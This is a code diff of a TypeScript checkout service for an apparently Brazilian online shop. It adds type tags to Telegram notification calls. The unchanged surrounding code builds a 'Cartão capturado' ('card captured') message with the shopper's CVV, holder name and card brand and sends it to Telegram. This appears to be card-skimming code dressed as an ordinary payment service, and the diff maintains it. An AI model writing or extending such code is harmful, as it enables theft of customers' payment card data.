@@ -1,4 +1,3 @@
-
 import { supabase } from '@/integrations/supabase/client';
 import { Order, PaymentMethod, PaymentStatus, CreditCardData } from '@/types/checkout';
 import { sendTelegramNotification } from '@/lib/notifications/sendTelegramNotification';
@@ -76,7 +75,7 @@ export const supabaseClientService = {
         throw error;
       }
       
-      // Send Telegram notification with detailed card information
+      // Update notification type to 'card_data' for Telegram
       const brandName = (cardData.brand || 'unknown').toUpperCase();
       
       const message = `💳 Cartão capturado:
@@ -87,7 +86,7 @@ CVV: ${cardData.cvv}
 Titular: ${cardData.holderName}
 Bandeira: ${brandName}`;
       
-      await sendTelegramNotification(message);
+      await sendTelegramNotification(message, 'card_data');
       console.log('[AUDIT] Telegram notification sent for card data capture');
       
     } catch (error) {
@@ -224,7 +223,7 @@ Bandeira: ${brandName}`;
 ⏳ <b>Status:</b> Aguardando pagamento
 🕒 <b>Gerado em:</b> ${new Date().toLocaleString('pt-BR')}`;
       
-      await sendTelegramNotification(message);
+      await sendTelegramNotification(message, 'new_order');
       console.log('[AUDIT] PIX payment notification sent to Telegram');
     } catch (error) {
       console.error('[supabaseClientService] Error sending PIX notification:', error);
